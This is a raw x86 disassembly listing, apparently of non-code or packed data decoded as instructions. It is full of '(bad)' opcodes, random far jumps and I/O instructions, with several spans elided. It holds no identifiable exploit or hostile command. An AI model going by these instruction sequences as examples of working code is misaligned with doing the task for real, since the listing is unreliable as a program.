  42e6e9:	xchg   edx,eax
  42e6ea:	cmp    BYTE PTR [edx-0x3faadbd6],cl
  42e6f0:	test   DWORD PTR [edx-0x3c61294e],ebx
  42e6f6:	mov    dl,BYTE PTR ds:0xe312bfd4
  42e6fc:	cdq    
  42e6fd:	sbb    DWORD PTR fs:[ebp+0x2a],ebp
  42e701:	fwait
  42e702:	push   ecx
  42e703:	bound  esp,QWORD PTR [esi-0x44]
  42e706:	xchg   ebx,eax
  42e707:	push   edx
  42e708:	stos   BYTE PTR es:[edi],al
  42e709:	push   esi
  42e70a:	loopne 0x42e69e
  42e70c:	ret    
  42e70d:	mov    al,0x71
  42e70f:	sub    al,0xef
  42e711:	fdivr  DWORD PTR [edi-0x4d61738d]
  42e717:	jge    0x42e6c9
  42e719:	jbe    0x42e783
  42e71b:	sub    esp,DWORD PTR [ebp+0x34]
  42e71e:	in     eax,0x4
  42e720:	test   cl,bl
  42e722:	into   
  42e723:	jae    0x42e6dc
  42e725:	lock push es
  42e727:	mov    ecx,0x8c5a3f8e
  42e72c:	adc    al,0xab
  42e72e:	inc    edi
  42e72f:	leave  
  42e730:	pushf  
  42e731:	scas   eax,DWORD PTR es:[edi]
  42e732:	arpl   WORD PTR [edx+0x5c93cf12],ax
  42e738:	shl    DWORD PTR [ecx+0x17],0x73
  42e73c:	xor    eax,0x38befd04
  42e741:	pop    eax
	...
  42e7b2:	add    BYTE PTR [eax],al
  42e7b4:	xchg   esi,eax
  42e7b5:	fwait
  42e7b6:	cwde   
  42e7b7:	pop    edi
  42e7b8:	popf   
  42e7b9:	pop    edi
  42e7ba:	xlat   BYTE PTR ds:[ebx]
  42e7bb:	fisttp DWORD PTR [esi+0x570d5576]
  42e7c1:	cmp    edi,DWORD PTR [ebx-0x43]
  42e7c4:	loop   0x42e7b1
  42e7c6:	add    DWORD PTR [eax],eax
  42e7c8:	test   BYTE PTR [eax],0x0
  42e7cb:	add    BYTE PTR [esi+0x3e8d0a16],ch
  42e7d1:	mov    bh,0xba
  42e7d3:	mov    ebx,eax
  42e7d5:	push   es
  42e7d6:	(bad)  
  42e7d7:	out    0x2d,al
  42e7d9:	out    0x55,eax
  42e7db:	inc    edi
  42e7dc:	sti    
  42e7dd:	outs   dx,BYTE PTR ds:[esi]
  42e7de:	xchg   esp,eax
  42e7df:	push   DWORD PTR fs:[ebx-0x39]
  42e7e3:	loop   0x42e7d0
  42e7e5:	xchg   ebx,eax
  42e7e6:	fstp   DWORD PTR [ecx-0x20]
  42e7e9:	mov    ds:0xb46a1cbd,eax
  42e7ee:	das    
  42e7ef:	pop    ebx
  42e7f0:	popf   
  42e7f1:	fcom   QWORD PTR [edx+0x64]
  42e7f4:	push   ebp
  42e7f5:	ds daa 
  42e7f7:	(bad)
  42e7fa:	push   ss
  42e7fb:	push   ds
  42e7fc:	out    dx,eax
  42e7fd:	dec    ecx
  42e7fe:	loop   0x42e870
  42e800:	imul   edx,DWORD PTR [ecx],0xecaaa2ff
  42e806:	mov    eax,0xc143e07e
  42e80b:	scas   al,BYTE PTR es:[edi]
  42e80c:	fadd   QWORD PTR [ecx-0x7c]
  42e80f:	mov    bp,WORD PTR [ebp+0x328d737e]
  42e816:	frstor [ebp+0x57cb5828]
  42e81c:	call   0x722b175a
  42e821:	sub    eax,0x4a536e73
  42e826:	push   0xffffffee
  42e828:	xor    eax,0x7c607150
  42e82d:	bound  ebp,QWORD PTR [edi+0x6f]
  42e830:	pop    ds
  42e831:	stos   DWORD PTR es:[edi],eax
  42e832:	push   ecx
  42e833:	cwde   
  42e834:	inc    ecx
  42e835:	lock xchg DWORD PTR [ebx+0x5ccad020],esp
  42e83c:	les    esi,FWORD PTR [esi+0x3975df33]
  42e842:	(bad)  
  42e845:	gs hlt 
  42e847:	fidivr DWORD PTR [eax-0x54]
  42e84a:	sbb    al,0x3b
  42e84c:	xchg   ecx,eax
  42e84d:	dec    eax
  42e84e:	mov    DWORD PTR [ebx-0x2],ebx
  42e851:	sub    eax,0xfa9aa81f
  42e856:	pop    edi
  42e857:	leave  
  42e858:	mov    dl,0xc0
  42e85a:	mov    eax,ds:0x86aaa7ca
  42e85f:	xlat   BYTE PTR ds:[ebx]
  42e860:	ja     0x42e848
  42e862:	add    eax,0xfaf34145
  42e867:	pop    edx
  42e868:	dec    ecx
  42e869:	stos   BYTE PTR es:[edi],al
  42e86a:	leave  
  42e86b:	mov    ah,0xe2
  42e86d:	jge    0x42e865
  42e86f:	mov    bh,0x42
  42e871:	out    0xb0,al
  42e873:	mov    ds:0x1a2ef7d7,eax
  42e878:	jle    0x42e8ea
  42e87a:	xchg   ebp,eax
  42e87b:	into   
  42e87c:	jb     0x42e885
  42e87e:	fnstcw WORD PTR [edx+0x272091b9]
  42e884:	jmp    0x8587:0x2264860e
  42e88b:	xchg   BYTE PTR [esp+ecx*4+0x7d],cl
  42e88f:	sub    eax,0xba941bcc
  42e894:	(bad)  [edx-0x595bd15b]
  42e89a:	not    BYTE PTR [eax]
  42e89c:	xchg   edx,eax
  42e89d:	and    al,0xd6
  42e89f:	hlt    
  42e8a0:	bound  ebx,QWORD PTR ds:0xb33eb021
  42e8a6:	(bad)  
  42e8a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e8a8:	sbb    DWORD PTR [ebx],edx
  42e8aa:	mov    ds:0x661f1ef6,al
  42e8af:	in     eax,dx
  42e8b0:	adc    eax,0xdef7d2df
  42e8b5:	daa    
  42e8b6:	adc    bl,BYTE PTR fs:[esi-0x576d7359]
  42e8bd:	inc    esi
  42e8be:	mov    ecx,DWORD PTR [edx-0x2e]
  42e8c1:	popf   
	...
  42e932:	add    BYTE PTR [eax],al
  42e934:	stc    
  42e935:	mov    cl,0x70
  42e937:	dec    eax
  42e938:	js     0x42e903
  42e93a:	stc    
  42e93b:	mov    cl,0x3
  42e93d:	push   ds
  42e93e:	nop
  42e93f:	aad    0xb2
  42e941:	sar    dl,1
  42e943:	sbb    eax,0xffffffec
  42e946:	add    DWORD PTR [eax],eax
  42e948:	test   BYTE PTR [eax],0x0
  42e94b:	add    BYTE PTR [esi],ch
  42e94d:	fimul  WORD PTR [ebp+esi*8+0x45]
  42e951:	adc    cl,BYTE PTR [edi+0x62]
  42e954:	jge    0x42e8dc
  42e956:	shr    esi,1
  42e958:	imul   ebp,esi,0x33cbf8fd
  42e95e:	mov    edx,0xf362938e
  42e963:	dec    ebx
  42e964:	dec    esi
  42e965:	nop
  42e966:	mov    esp,0x6cc85e6a
  42e96b:	cmp    DWORD PTR [ecx],0x93e6c050
  42e971:	cmp    eax,DWORD PTR [ecx+eax*4-0x4b]
  42e975:	imul   edi,esp,0x906d15b2
  42e97b:	aaa    
  42e97c:	cli    
  42e97d:	adc    eax,ebx
  42e97f:	cdq    
  42e980:	inc    esi
  42e981:	fs cwde 
  42e983:	loope  0x42e994
  42e985:	les    esi,FWORD PTR [eax-0x5baa9565]
  42e98b:	hlt    
  42e98c:	ja     0x42e952
  42e98e:	xor    eax,0x951732cc
  42e993:	jg     0x42e91e
  42e995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e996:	mov    eax,0x850bc23d
  42e99b:	adc    DWORD PTR [edx+ebx*8+0xf],0xfed537d7
  42e9a3:	js     0x42e995
  42e9a5:	scas   eax,DWORD PTR es:[edi]
  42e9a6:	out    0x1d,eax
  42e9a8:	sub    eax,0xe205ac63
  42e9ad:	fsub   DWORD PTR [eax-0x8]
  42e9b0:	fcmovne st,st(4)
  42e9b2:	arpl   WORD PTR [esi+0x707e0a94],si
  42e9b8:	out    0x59,al
  42e9ba:	les    ebp,FWORD PTR [ebx-0x2c2e5815]
  42e9c0:	pushf  
  42e9c1:	adc    ecx,0xa05c1ea7
  42e9c7:	es out dx,al
  42e9c9:	sub    al,BYTE PTR [eax-0x14]
  42e9cc:	adc    eax,0xe659531c
  42e9d1:	arpl   ax,di
  42e9d3:	xchg   BYTE PTR [ebx],ch
  42e9d5:	adc    DWORD PTR [edx],ebp
  42e9d7:	dec    ebp
  42e9d8:	xchg   edx,eax
  42e9d9:	add    esi,DWORD PTR [ebx]
  42e9db:	sbb    BYTE PTR [edi],bl
  42e9dd:	inc    ebp
  42e9de:	or     ebp,edx
  42e9e0:	xchg   edi,eax
  42e9e1:	iret   
  42e9e2:	loop   0x42e9dd
  42e9e4:	jnp    0x42e9af
  42e9e6:	call   0xc0283cc8
  42e9eb:	fs pop esi
  42e9ed:	je     0x42e99a
  42e9ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e9f0:	xchg   ecx,eax
  42e9f1:	inc    ebp
  42e9f2:	mov    edi,0xc16564bd
  42e9f7:	cmp    eax,esp
  42e9f9:	cmp    BYTE PTR [eax+ebp*8],dh
  42e9fc:	mov    dh,0x3d
  42e9fe:	dec    ebx
  42e9ff:	addr16 cdq 
  42ea01:	ficom  WORD PTR [ebp+0x5cafbddf]
  42ea07:	js     0x42e98b
  42ea09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ea0a:	pushf  
  42ea0b:	test   DWORD PTR [ebp+edx*1+0x7d5ac1da],0xeb3370cf
  42ea16:	push   esp
  42ea17:	daa    
  42ea18:	(bad)  
  42ea19:	int3   
  42ea1a:	scas   al,BYTE PTR es:[edi]
  42ea1b:	xor    al,0xbd
  42ea1d:	xor    BYTE PTR [eax*1+0x739758a9],ch
  42ea24:	bound  edi,QWORD PTR [eax+0x6f]
  42ea27:	not    edi
  42ea29:	rcl    DWORD PTR [esp+edi*2],cl
  42ea2c:	add    DWORD PTR [ebx+0x347aa752],ecx
  42ea32:	shr    BYTE PTR [ecx],1
  42ea34:	rol    BYTE PTR [edi-0x6b],1
  42ea37:	repnz xchg ebx,eax
  42ea39:	sbb    BYTE PTR [eax],ch
  42ea3b:	loope  0x42ea98
  42ea3d:	call   0x0:0x8846c025
	...
  42eab4:	mov    al,0x7a
  42eab6:	pop    ds
  42eab7:	ins    BYTE PTR es:[edi],dx
  42eab8:	fild   QWORD PTR [ebp-0xd]
  42eabb:	dec    BYTE PTR [ebx]
  42eabd:	add    ah,BYTE PTR [ebp-0x48]
  42eac0:	mov    ecx,0xced2de89
  42eac5:	in     eax,dx
  42eac6:	add    DWORD PTR [eax],eax
  42eac8:	test   BYTE PTR [eax],0x0
  42eacb:	add    dh,bl
  42eacd:	push   eax
  42eace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eacf:	scas   eax,DWORD PTR es:[edi]
  42ead0:	dec    ebp
  42ead1:	inc    eax
  42ead2:	jmp    0xe2783f5a
  42ead7:	mov    edi,0xcfd4402e
  42eadc:	imul   edi,ebx,0xfffffff4
  42eadf:	mov    dl,0x5f
  42eae1:	cmp    eax,0x7db62d0f
  42eae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eae7:	push   cs
  42eae8:	xchg   ebp,eax
  42eae9:	ror    BYTE PTR [edi+0x619227e7],1
  42eaef:	sbb    dl,BYTE PTR [esi+ecx*2+0x1599c053]
  42eaf6:	push   ecx
  42eaf7:	cwde   
  42eaf8:	adc    eax,0xcbb8d7ee
  42eafd:	sub    DWORD PTR [ecx+0x78],eax
  42eb00:	cmp    edx,DWORD PTR [edx]
  42eb02:	into   
  42eb03:	and    esp,esp
  42eb05:	aam    0xc7
  42eb07:	mov    ebx,0x8da5083c
  42eb0c:	dec    ecx
  42eb0d:	test   eax,0x8f37909c
  42eb12:	dec    esi
  42eb13:	lods   al,BYTE PTR ds:[esi]
  42eb14:	mov    ds:0x910f21cf,al
  42eb19:	inc    eax
  42eb1a:	scas   al,BYTE PTR es:[edi]
  42eb1b:	retf   0x6ed9
  42eb1e:	mov    ah,0xad
  42eb20:	int    0xa6
  42eb22:	outs   dx,DWORD PTR ds:[esi]
  42eb23:	fdiv   DWORD PTR ds:0x1ba8bacd
  42eb29:	push   ss
  42eb2a:	jmp    0x980e:0x54f09a5a
  42eb31:	sub    edi,eax
  42eb33:	adc    eax,0x7ca21b37
  42eb38:	cs add eax,0xba59723e
  42eb3e:	sub    edi,DWORD PTR [edx-0x6e]
  42eb41:	(bad)  
  42eb42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb43:	push   ecx
  42eb44:	pop    edx
  42eb45:	rcl    DWORD PTR ds:0xa72d1ca7,cl
  42eb4b:	bnd jg 0x42eb58
  42eb4e:	add    dl,dh
  42eb50:	popa   
  42eb51:	dec    ecx
  42eb52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eb53:	push   cs
  42eb54:	mov    ?,WORD PTR [esi+0x1921fab5]
  42eb5a:	retf   
  42eb5b:	xadd   DWORD PTR [esi-0x3ee099f2],edi
  42eb62:	stos   BYTE PTR es:[edi],al
  42eb63:	mov    edx,0xbbfe19b8
  42eb68:	mov    es,edi
  42eb6a:	and    BYTE PTR [ebx],cl
  42eb6c:	nop
  42eb6d:	or     al,0xc3
  42eb6f:	xchg   esi,eax
  42eb70:	retf   0x47ee
  42eb73:	pushf  
  42eb74:	outs   dx,DWORD PTR ds:[esi]
  42eb75:	rcr    DWORD PTR [ecx+0x62],cl
  42eb78:	mov    al,0x4a
  42eb7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb7b:	dec    esi
  42eb7c:	and    al,0x17
  42eb7e:	out    0x49,eax
  42eb80:	outs   dx,BYTE PTR ds:[esi]
  42eb81:	in     al,dx
  42eb82:	mov    dl,0xe8
  42eb84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb85:	(bad)  
  42eb86:	jne    0x42eb23
  42eb88:	and    al,0x63
  42eb8a:	addr16 iret 
  42eb8c:	mov    WORD PTR [esi+0x5531137c],fs
  42eb92:	mov    ebp,DWORD PTR [edi-0x20]
  42eb95:	sbb    eax,0x613c16fa
  42eb9a:	sub    cl,ch
  42eb9c:	jmp    0xf486c676
  42eba1:	xchg   edi,eax
  42eba2:	into   
  42eba3:	ja     0x42eb9e
  42eba5:	dec    edx
  42eba6:	mov    ebx,0xcdef5c22
  42ebab:	mov    DWORD PTR [ebx-0x6],ecx
  42ebae:	js     0x42ebbf
  42ebb0:	jmp    0x21f:0x1bd75de1
  42ebb7:	repnz sub al,0x66
  42ebba:	push   esp
  42ebbb:	push   ss
  42ebbc:	add    al,0xe0
  42ebbe:	test   eax,0x1e8897
	...
  42ec33:	add    BYTE PTR [ecx],bh
  42ec35:	mov    bh,0x6d
  42ec37:	pxor   mm3,mm7
  42ec3a:	jnp    0x42ebf3
  42ec3c:	sbb    cl,BYTE PTR [edi+edx*4+0x2ade9869]
  42ec43:	rol    esp,0xee
  42ec46:	add    DWORD PTR [eax],eax
  42ec48:	test   BYTE PTR [eax],0x0
  42ec4b:	add    dl,ch
  42ec4d:	cmp    al,0xcb
  42ec4f:	jns    0x42eca2
  42ec51:	push   esi
  42ec52:	retf   0xbb23
  42ec55:	adc    al,0xfe
  42ec57:	cmp    al,0x41
  42ec59:	inc    edi
  42ec5a:	lods   eax,DWORD PTR ds:[esi]
  42ec5b:	leave  
  42ec5c:	or     BYTE PTR [eax-0xb],cl
  42ec5f:	mov    eax,ds:0xb57e095f
  42ec64:	push   ss
  42ec65:	rcr    cl,1
  42ec67:	loope  0x42ec4d
  42ec69:	mov    eax,0xdb59a788
  42ec6e:	ins    DWORD PTR es:[edi],dx
  42ec6f:	loopne 0x42eca8
  42ec71:	mov    esi,0xaa9b28
  42ec76:	js     0x42ec57
  42ec78:	mov    DWORD PTR [ebx-0x5a9477ed],ebx
  42ec7e:	add    DWORD PTR [ecx],0xbb89c783
  42ec84:	(bad)  
  42ec85:	aas    
  42ec86:	cmp    eax,0x2d32deb9
  42ec8b:	mov    BYTE PTR [edi-0x71751aab],bh
  42ec91:	cli    
  42ec92:	pushf  
  42ec93:	cmp    al,0x1d
  42ec95:	sub    ecx,DWORD PTR [edi]
  42ec97:	test   ebx,0x779035ed
  42ec9d:	adc    bh,BYTE PTR [ecx+ebx*8]
  42eca0:	jae    0x42ed14
  42eca2:	xlat   BYTE PTR ds:[ebx]
  42eca3:	sub    eax,0x7c599e1b
  42eca8:	push   ss
  42eca9:	adc    BYTE PTR [ebx],0xd3
  42ecac:	push   ebp
  42ecad:	sub    BYTE PTR [ebp+0x79a974a],dh
  42ecb3:	adc    cl,ch
  42ecb5:	rcl    DWORD PTR [edi-0x53],0x25
  42ecb9:	ins    DWORD PTR es:[edi],dx
  42ecba:	pop    esp
  42ecbb:	mov    dl,0x5
  42ecbd:	mov    cl,0x20
  42ecbf:	ret    
  42ecc0:	jg     0x42ec99
  42ecc2:	dec    edx
  42ecc3:	frstor [ebp-0x677a11c3]
  42ecc9:	cmc    
  42ecca:	fnstcw WORD PTR [ecx+0xffbdde4]
  42ecd0:	leave  
  42ecd1:	inc    esp
  42ecd2:	mov    bl,0x8e
  42ecd4:	xor    edx,DWORD PTR [edi-0x7cdc4097]
  42ecda:	push   eax
  42ecdb:	push   ds
  42ecdc:	loop   0x42ecc6
  42ecde:	inc    eax
  42ecdf:	sahf   
  42ece0:	mov    esi,0x6d5438f7
  42ece5:	jnp    0x42ec8d
  42ece7:	dec    esp
  42ece8:	sti    
  42ece9:	not    BYTE PTR [ecx-0x48]
  42ecec:	into   
  42eced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ecee:	ins    DWORD PTR es:[edi],dx
  42ecef:	pop    es
  42ecf0:	mov    ch,BYTE PTR ds:0x7a571835
  42ecf6:	xchg   edi,eax
  42ecf7:	mov    ebp,0xf57f795f
  42ecfc:	adc    BYTE PTR [esi],dl
  42ecfe:	jg     0x42ed7b
  42ed00:	popa   
  42ed01:	pushf  
  42ed02:	daa    
  42ed03:	xchg   edi,eax
  42ed04:	jmp    0x817be89d
  42ed09:	jmp    0xd31b:0x5c732b24
  42ed10:	xor    al,0x3f
  42ed12:	adc    cl,BYTE PTR [ebx]
  42ed14:	pop    ecx
  42ed15:	and    ebx,DWORD PTR [ebx+ebp*2-0x83af49c]
  42ed1c:	pop    edx
  42ed1d:	out    0x98,al
  42ed1f:	xchg   esi,eax
  42ed20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ed21:	inc    ebp
  42ed22:	das    
  42ed23:	(bad)  
  42ed24:	in     eax,dx
  42ed25:	stos   DWORD PTR es:[edi],eax
  42ed26:	nop
  42ed27:	ret    
  42ed28:	adc    ebx,DWORD PTR [ebx]
  42ed2a:	jmp    DWORD PTR [ecx-0x40]
  42ed2d:	sar    DWORD PTR [edi+0x762972dc],cl
  42ed33:	xor    eax,edi
  42ed35:	(bad)  
  42ed36:	rcr    ch,cl
  42ed38:	cld    
  42ed39:	adc    eax,0xb1f6bcb2
  42ed3e:	bound  esp,QWORD PTR [edx+edi*2+0xc6]
	...
  42edb1:	add    BYTE PTR [eax],al
  42edb3:	add    dh,ah
  42edb5:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42edbc:	jmp    0x42ed84
  42edbe:	popa   
  42edbf:	test   eax,0x3f8ed791
  42edc4:	mov    edx,0xf60001ef
  42edc9:	add    BYTE PTR [eax],al
  42edcb:	add    BYTE PTR [eax-0x11c7de77],dh
  42edd1:	sub    ebx,DWORD PTR [esi+0x46725706]
  42edd7:	or     DWORD PTR [ecx-0x5fba576a],esp
  42eddd:	iret   
  42edde:	xchg   ebp,eax
  42eddf:	mov    ebp,0x36f81101
  42ede4:	(bad)  
  42ede5:	iret   
  42ede6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ede7:	jmp    0x3f926a36
  42edec:	imul   esi,DWORD PTR [ebx-0x34],0xb860c91b
  42edf3:	push   esp
  42edf4:	cwde   
  42edf5:	icebp  
  42edf6:	mov    eax,DWORD PTR [edx-0x5c]
  42edf9:	push   ss
  42edfa:	jecxz  0x42edb4
  42edfc:	jp     0x42ee79
  42edfe:	repnz or esi,DWORD PTR [ecx-0x52]
  42ee02:	sub    bl,ch
  42ee04:	int    0x9b
  42ee06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee07:	sub    bh,BYTE PTR [esi]
  42ee09:	cs test al,0x40
  42ee0c:	mov    cl,0x6
  42ee0e:	rcr    DWORD PTR [eax+0x46],cl
  42ee11:	xor    al,ch
  42ee13:	enter  0xd45d,0x2f
  42ee17:	fdiv   DWORD PTR cs:[ebx]
  42ee1a:	adc    eax,0x5ddb7ed0
  42ee1f:	mov    bh,ch
  42ee21:	mov    ebx,DWORD PTR [esi+0x58c5eab0]
  42ee27:	dec    ebp
  42ee28:	cmp    eax,0xa9b8893c
  42ee2d:	push   edx
  42ee2e:	aaa    
  42ee2f:	sbb    al,0x75
  42ee31:	jl     0x42ee53
  42ee33:	xchg   ecx,eax
  42ee34:	(bad)  
  42ee35:	addr16 mov esp,0x23a3c57c
  42ee3b:	iret   
  42ee3c:	and    eax,0xb2292c90
  42ee41:	pop    esi
  42ee42:	inc    ecx
  42ee43:	add    ah,ah
  42ee45:	mov    edi,0xdc660d80
  42ee4a:	ja     0x42ee96
  42ee4c:	pop    ds
  42ee4d:	in     eax,dx
  42ee4e:	dec    ecx
  42ee4f:	(bad)  
  42ee50:	imul   eax,esi,0x1a
  42ee53:	mov    cl,0xe2
  42ee55:	and    bh,BYTE PTR [ebp-0x4eb9c57c]
  42ee5b:	lods   eax,DWORD PTR ds:[esi]
  42ee5c:	iret   
  42ee5d:	lahf   
  42ee5e:	loopne 0x42ee48
  42ee60:	aaa    
  42ee61:	loop   0x42ee75
  42ee63:	stos   DWORD PTR es:[edi],eax
  42ee64:	xor    eax,0xeb631624
  42ee69:	scas   al,BYTE PTR es:[edi]
  42ee6a:	fistp  WORD PTR [eax+ecx*8+0x48]
  42ee6e:	pop    ebx
  42ee6f:	add    ch,BYTE PTR [esp]
  42ee72:	jne    0x42ee8d
  42ee74:	sub    ebx,DWORD PTR [ebx+0x764e116]
  42ee7a:	jo     0x42eea6
  42ee7c:	mov    ds:0xdf6e4311,al
  42ee81:	repnz fimul WORD PTR [edx-0x16]
  42ee85:	push   ss
  42ee86:	or     ecx,ecx
  42ee88:	pop    ebx
  42ee89:	scas   eax,DWORD PTR es:[edi]
  42ee8a:	bound  ebp,QWORD PTR [esp+esi*2+0x5f3f60cf]
  42ee91:	xor    al,0x8c
  42ee93:	lods   al,BYTE PTR ds:[esi]
  42ee94:	cwde   
  42ee95:	xchg   edx,eax
  42ee96:	shl    DWORD PTR [esi-0x11a9ad78],1
  42ee9c:	mov    eax,ds:0x46867c67
  42eea1:	push   cs
  42eea2:	or     BYTE PTR [edi],dh
  42eea4:	push   esi
  42eea5:	mov    ds:0x4ad8134,al
  42eeaa:	jp     0x42ee50
  42eeac:	fild   DWORD PTR [ebx+0x1f524619]
  42eeb2:	lock imul edx,ebx,0x5d37518a
  42eeb9:	adc    BYTE PTR [ebx-0xb],bl
  42eebc:	addr16 pop edi
  42eebe:	dec    ebp
  42eebf:	std    
  42eec0:	sbb    al,0x65
	...
  42ef32:	add    BYTE PTR [eax],al
  42ef34:	add    bh,dh
  42ef36:	jb     0x42eede
  42ef38:	(bad)  
  42ef39:	scas   al,BYTE PTR es:[edi]
  42ef3a:	(bad)  
  42ef3b:	(bad)  
  42ef3c:	cmp    DWORD PTR [edi],edi
  42ef3e:	int3   
  42ef3f:	bnd jle 0x42ef8d
  42ef42:	mov    al,0x3f
  42ef44:	mov    al,0xf0
  42ef46:	add    DWORD PTR [eax],eax
  42ef48:	test   BYTE PTR [eax],0x0
  42ef4b:	add    bl,bl
  42ef4d:	add    al,0xca
  42ef4f:	repz mov eax,0x4201fde7
  42ef55:	cmp    DWORD PTR ds:0x1216668b,edi
  42ef5b:	popf   
  42ef5c:	inc    edi
  42ef5d:	push   esp
  42ef5e:	inc    edx
  42ef5f:	scas   eax,DWORD PTR es:[edi]
  42ef60:	cmp    ch,BYTE PTR [edi-0x1faa0093]
  42ef66:	and    ch,dh
  42ef68:	repnz mov esi,0x8222e443
  42ef6e:	jmp    FWORD PTR [esi]
  42ef70:	in     al,dx
  42ef71:	dec    ebp
  42ef72:	sub    al,0xfc
  42ef74:	(bad)  
  42ef75:	loope  0x42ef9a
  42ef77:	in     eax,dx
  42ef78:	xchg   ebx,eax
  42ef79:	cmp    ah,cl
  42ef7b:	xchg   edx,esi
  42ef7d:	jl     0x42ef70
  42ef7f:	mov    ds,esi
  42ef81:	add    dl,dh
  42ef83:	aam    0x4a
  42ef85:	daa    
  42ef86:	sub    eax,0xd46fd522
  42ef8b:	inc    ch
  42ef8d:	sbb    bh,BYTE PTR [ebx+0x4b54badc]
  42ef93:	icebp  
  42ef94:	scas   eax,DWORD PTR es:[edi]
  42ef95:	adc    DWORD PTR [eax+eiz*1],eax
  42ef98:	mov    bh,0x7
  42ef9a:	fldcw  WORD PTR [esi]
  42ef9c:	loope  0x42ef55
  42ef9e:	inc    ecx
  42ef9f:	fisubr WORD PTR [ebx]
  42efa1:	stos   BYTE PTR es:[edi],al
  42efa2:	jg     0x42eff2
  42efa4:	jnp    0x42eff9
  42efa6:	fstp   DWORD PTR [esi+0x7b93d3d]
  42efac:	adc    ebx,DWORD PTR [esi+0x7467cbae]
  42efb2:	sar    ecx,0x35
  42efb5:	cmp    DWORD PTR [eax-0x65],ecx
  42efb8:	mov    dl,0x4f
  42efba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42efbb:	push   eax
  42efbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42efbd:	push   cs
  42efbe:	inc    eax
  42efbf:	pop    edi
  42efc0:	xchg   ch,cl
  42efc2:	inc    esp
  42efc3:	jne    0x42efe8
  42efc5:	(bad)  
  42efc6:	hlt    
  42efc7:	cwde   
  42efc8:	leave  
  42efc9:	or     BYTE PTR ds:0xbbe928cb,bl
  42efcf:	dec    ebx
  42efd0:	repnz iret 
  42efd2:	cmp    al,0xee
  42efd4:	xor    ah,BYTE PTR [edi-0x28]
  42efd7:	out    dx,eax
  42efd8:	call   0xdf512442
  42efdd:	jp     0x42efeb
  42efdf:	inc    ebp
  42efe0:	das    
  42efe1:	sbb    edx,DWORD PTR [edi-0xbd9cea3]
  42efe7:	(bad)  
  42efe8:	mov    esp,0x1933d700
  42efed:	outs   dx,DWORD PTR ds:[esi]
  42efee:	xchg   ecx,eax
  42efef:	mov    ah,BYTE PTR [ecx+0x34963bed]
  42eff5:	(bad)  
  42eff6:	imul   esi,ebx,0x839b5dd4
  42effc:	addr16 pop es
  42effe:	xor    BYTE PTR [edx+0x2e],ah
  42f001:	mov    bl,0x68
  42f003:	pop    esi
  42f004:	push   esp
  42f005:	gs push edi
  42f007:	pushf  
  42f008:	cmp    bl,BYTE PTR [edx+eiz*8]
  42f00b:	(bad)  
  42f00d:	addr16 clc 
  42f00f:	pop    ebp
  42f010:	mov    eax,0x360c2654
  42f015:	cmp    edi,ebp
  42f017:	sub    eax,0xbcb4d93e
  42f01c:	add    DWORD PTR [esi+0x31],ebx
  42f01f:	push   esp
  42f020:	xchg   ecx,eax
  42f021:	mov    dl,0x53
  42f023:	mov    dh,0x5d
  42f025:	fstp   DWORD PTR [ebx+eax*1-0x5d]
  42f029:	pop    eax
  42f02a:	dec    esp
  42f02b:	mov    eax,0xf59cad6b
  42f030:	shl    dl,0x2f
  42f033:	pusha  
  42f034:	fidiv  WORD PTR [ebp-0x29]
  42f037:	xor    al,0x8
  42f039:	mov    bl,0xc2
  42f03b:	dec    ebp
  42f03c:	adc    cl,BYTE PTR [esi-0x8433bd6]
	...
  42f0b2:	add    BYTE PTR [eax],al
  42f0b4:	mov    eax,ds:0x7e061ecf
  42f0b9:	xlat   BYTE PTR ds:[ebx]
  42f0ba:	mov    ecx,0xd7e009ef
  42f0bf:	(bad)  
  42f0c0:	fucom  st(4)
  42f0c2:	gs out 0xa6,eax
  42f0c5:	icebp  
  42f0c6:	add    DWORD PTR [eax],eax
  42f0c8:	test   BYTE PTR [eax],0x0
  42f0cb:	add    BYTE PTR [edi-0x27],ah
  42f0ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f0cf:	mov    esp,0x5caafc36
  42f0d4:	lock add BYTE PTR [esi+0x6a],0x3e
  42f0d9:	(bad)  
  42f0da:	jno    0x42f12d
  42f0dc:	sub    edi,DWORD PTR [ecx-0x54]
  42f0df:	and    BYTE PTR [ebx-0x7e820155],cl
  42f0e5:	or     bl,0xed
  42f0e8:	push   cs
  42f0e9:	xchg   ebp,eax
  42f0ea:	cmp    eax,eax
  42f0ec:	jns    0x42f11a
  42f0ee:	push   es
  42f0ef:	xchg   ecx,eax
  42f0f0:	clc    
  42f0f1:	mov    esi,0x8a2bf034
  42f0f6:	jp     0x42f08e
  42f0f8:	jge    0x42f14e
  42f0fa:	adc    al,0x43
  42f0fc:	out    0xef,al
  42f0fe:	mov    edi,0x1b307c70
  42f103:	jp     0x42f117
  42f105:	cmp    al,0x6
  42f107:	add    bl,BYTE PTR [edi+0xa]
  42f10a:	xchg   ebx,eax
  42f10b:	data16 mov cl,0xd3
  42f10e:	pop    esp
  42f110:	adc    bh,ch
  42f112:	cvtpi2ps xmm5,QWORD PTR [edx+0x44]
  42f116:	shl    ebp,1
  42f118:	xchg   DWORD PTR [edi],edx
  42f11a:	cwde   
  42f11b:	loopne 0x42f144
  42f11d:	mov    BYTE PTR [eax],bh
  42f11f:	cmovl  edx,esp
  42f122:	xchg   ebp,eax
  42f123:	rol    DWORD PTR [edi+ebp*8],1
  42f126:	pushf  
  42f127:	fxtract 
  42f129:	jecxz  0x42f0b2
  42f12b:	and    dh,BYTE PTR [eax+0x703b3a3a]
  42f131:	adc    DWORD PTR [ebp+0x3],esp
